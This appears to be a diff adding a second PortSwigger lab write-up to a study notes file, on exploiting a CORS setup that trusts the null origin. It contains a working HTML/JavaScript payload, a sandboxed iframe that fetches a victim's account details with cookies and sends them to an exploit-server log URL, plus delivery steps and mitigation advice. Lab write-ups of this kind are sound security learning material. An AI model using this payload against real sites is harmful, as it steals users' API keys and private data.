@@ -42,3 +42,57 @@ Create an HTML/JS payload on the Exploit Server. This script makes an authentica
 Copy the extracted API key and submit it via the "Submit solution" button on the lab's main page. Lab Solved! 
 
 **Key Takeaway / Mitigation**: Never dynamically reflect the Origin header in the Access-Control-Allow-Origin header without strict validation. If an API is intended to be public, it should not support credentials. If it requires credentials, it must validate the Origin against a strict, hardcoded allowlist of trusted domains.
+
+
+
+
+# 2nd lab
+
+
+
+#  Lab: CORS vulnerability with trusted null origin
+**Platform:** PortSwigger Web Security Academy
+**Goal:** Exploit a CORS misconfiguration that explicitly trusts the `null` origin to steal the administrator's API key.
+**Vulnerability:** Whitelisted `null` Origin in CORS configuration. 
+
+## The Concept (The "null" Origin Trap)
+Developers sometimes configure the `Access-Control-Allow-Origin` header to accept the `null` origin to support local development (e.g., loading `file://` URIs) or requests from sandboxed environments. However, an attacker can easily generate a request with a `null` origin. By embedding an exploitation script inside an `<iframe sandbox="allow-scripts allow-top-navigation">`, the browser treats the iframe's content as being from a unique, opaque origin, effectively setting the `Origin` header to `null`. The vulnerable server will accept this and return the sensitive data.
+
+##  Step-by-Step Exploitation
+
+### Step 1: Craft the Sandboxed Payload
+Create an HTML payload on the Exploit Server using a sandboxed iframe. We use a `data:` URI to embed the JavaScript directly into the iframe's source. 
+**Crucial:** Do NOT include `allow-same-origin` in the sandbox attributes. This ensures the origin remains `null`.
+
+```html
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,
+    <script>
+        var req = new XMLHttpRequest();
+        req.onload = function() {
+            // Exfiltrate the stolen data to the attacker's log
+            window.location = '[https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key=](https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key=)' + encodeURIComponent(this.responseText);
+        };
+        // Request the sensitive endpoint
+        req.open('GET', '[https://YOUR-LAB-ID.web-security-academy.net/accountDetails](https://YOUR-LAB-ID.web-security-academy.net/accountDetails)', true);
+        req.withCredentials = true; // Include session cookies
+        req.send();
+    </script>
+"></iframe>
+```
+### Step 2: Exfiltrate the Data
+1. Replace the Lab ID and Exploit Server ID in the payload.
+
+2. Store and click Deliver exploit to victim.
+
+3. The victim's browser executes the script inside the sandbox. The request is sent with Origin: null.
+
+4. The server responds with Access-Control-Allow-Origin: null and the API key.
+
+5. Go to the Exploit Server's Access log.
+
+6. Find the exfiltration request (GET /log?key=...) and extract the apikey from the URL-decoded string.
+
+### Step 3: Submit the Solution
+Submit the extracted API key to solve the lab. 
+
+**Key Takeaway / Mitigation:** Never whitelist the null origin in a production environment. The null origin is NOT synonymous with "trusted internal request." Any malicious website can easily spawn a sandboxed iframe to originate requests with a null origin.
